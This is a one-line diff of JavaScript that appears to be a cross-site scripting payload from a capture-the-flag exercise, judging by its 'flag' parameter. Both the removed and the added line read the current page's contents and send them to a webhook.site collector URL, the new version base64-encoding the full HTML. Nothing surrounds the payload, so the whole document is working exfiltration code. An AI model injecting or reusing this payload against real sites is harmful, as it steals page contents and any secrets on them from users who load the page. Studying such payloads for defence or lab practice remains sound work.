@@ -1,1 +1,1 @@
-fetch(window.location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)))
+fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(document.documentElement.innerHTML));
